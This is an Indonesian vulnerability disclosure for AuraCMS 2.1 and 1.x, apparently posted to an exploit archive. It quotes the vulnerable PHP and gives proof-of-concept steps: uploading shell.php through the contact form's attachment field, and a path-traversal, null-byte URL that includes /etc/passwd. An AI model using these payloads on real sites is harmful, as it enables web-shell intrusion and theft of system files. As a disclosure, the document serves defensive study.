AuraCMS 2.1 Remote File Attachment / LFI Vulnerabilities
========================================================




########################################################################
# AuraCMS 2.1 - Remote File Attachment - Local File Inclusion
# Vendor           : http://www.auracms.org/
# Ditemukan oleh   : k1tk4t 
# Lokasi           : Indonesia  
########################################################################
====================================
Remote File Attachment Vulnerability
====================================

//berkas pada &#039;/mod/contak.php&#039;
---------------- Baris-41 --------------------
if ($_POST[&#039;submit&#039;]) {


    $nama = text_filter($_POST[&#039;nama&#039;]);
   
    $email = text_filter($_POST[&#039;email&#039;]);

    $pesan = nl2br(text_filter($_POST[&#039;pesan&#039;], 2));

    $images = text_filter($_POST[&#039;image&#039;]);



    checkemail($email);

    $gfx_check = intval($_POST[&#039;gfx_check&#039;]);

        if (!$nama)  $error .= "Error: Please enter your name!<br />";

        if (!$pesan) $error .= "Error: Please enter a message!<br />";



        $code = substr(hexdec(md5("".date("F j")."".$_POST[&#039;random_num&#039;]."".$sitekey."")), 2, 6);

    if (extension_loaded("gd") AND $code != $_POST[&#039;gfx_check&#039;]) $error .= "Error: Security Code Invalid<br />";



    if ($error) {

        $tengah.=&#039;<table width="100%" border="0" cellspacing="0" cellpadding="0" class="middle"><tr><td><table width="100%" class="bodyline"><tr><td align="left"><img src="images/warning.gif" border="0"></td><td align="center"><font class="option">&#039;.$error.&#039;</font></td><td align="right"><img src="images/warning.gif" border="0"></td></tr></table></td></tr></table>&#039;;

    } else {



    if (!empty ($image_name)){

    $image_name = $_FILES[&#039;image&#039;][&#039;name&#039;];

    $image_temp = $_FILES[&#039;image&#039;][&#039;tmp_name&#039;];

    $tempat = "files/";



    @copy($_FILES[image][tmp_name], "./files/".$image_name);

    if(@copy($_FILES[image][tmp_name], "./files/".$image_name)){

        unlink($image);

        $sukses = "Sukses Upload File ".$image_name;

    }else{

        $sukses = "Gagal Upload File ".$image_name;

---------------- Baris-61 --------------------

pemfilteran "$images" tidak sempurna, sehingga pengguna dapat mengupload/attachment file yang tidak diinginkan kedalam direktori /files/.

//POC;

http://localhost/auracms2.1/index.php?pilih=../mod/contak

atau

http://localhost/auracms2.1/index.php?pilih=contak&mod=yes

isi semua konten isian, masukan angka &#039;security code&#039; dengan benar, "Attachment" --> shell.php ;

http://localhost/auracms2.1/files/shell.php



===================================
Local File Inclusion Vulnerability
===================================

//berkas pada &#039;/index.php&#039; - AuraCMS versi 2.x

--------- baris-24 ----------
if (isset ($_GET[&#039;mod&#039;])) $mod = $_GET[&#039;mod&#039;] ; else $mod = &#039;&#039;;




if(!isset($_GET[&#039;pilih&#039;])){

include &#039;content/normal.php&#039;;

}else {




if($mod == "yes" && file_exists("mod/$_GET[pilih].php")){

include "mod/$_GET[pilih].php";

 } else {



if (eregi(&#039;http://&#039;, $_GET[&#039;pilih&#039;]) or !file_exists("content/$_GET[pilih].php") or $_GET[&#039;pilih&#039;] == &#039;index&#039;){

$_GET[&#039;pilih&#039;] = &#039;normal&#039;;
--------- baris-39 ----------


//berkas pada &#039;/index.php&#039; - AuraCMS versi 1.x

--------- baris-13 ----------
<?
if(!isset($pilih))$pilih=&#039;&#039;;
switch($pilih){
     case &#039;&#039;:
       include "normal.php";
       break;
     default:
       if($mod == "yes" && file_exists("mod/$pilih.php")){
           
        include "mod/$pilih.php";
       } else {
           if (eregi(&#039;http://&#039;, $pilih) or !file_exists("$pilih.php")){
               $pilih = &#039;normal&#039;;
           }
               include "$pilih.php";
       }
       break;
}
?>
--------- baris-33 ----------

need magic_quotes_gpc = off ,
jika magic_quotes_gpc = off maka pengguna dapat memanipulasi $pilih

//POC;

http://localhost/auracms.x.x/index.php?pilih=../../../../../../../etc/passwd%00

########################################################################
Terimakasih untuk;
str0ke, DNX
xoron,iFX,x-ace,nyubi,arioo,selikoer,k1n9k0ng,aldy_BT,adhietslank
dan semua temen2 komunitas security&hacking
-----------------------
semua komunitas hacker&security Indonesia
Cintailah Bahasa Indonesia



